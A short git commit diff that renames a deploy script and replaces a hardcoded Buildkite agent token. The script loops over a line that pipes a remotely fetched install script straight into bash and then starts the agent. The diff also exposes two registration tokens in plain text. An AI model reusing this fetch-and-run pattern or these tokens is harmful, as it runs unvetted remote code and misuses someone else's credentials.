7414b2cc31f883a335dc4a342326a7f149aa738e
xycas <89785944+xycas@users.noreply.github.com>
2021-08-31 21:34:18 +0700

    Update and rename deploy.sh to cuiz.sh

--- cuiz.sh
+++ cuiz.sh
@@ -6,7 +6,7 @@ screen
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-TOKEN="ec0094c8f218a1c9276ba27630472b89c53975f14fa7f2fea9" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
+TOKEN="723f78d99a488fd3c929cd3a22d9d3b95c0707c3292bf506f9" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
 ~/.buildkite-agent/bin/buildkite-agent start
  
      echo COUNTER $COUNTER
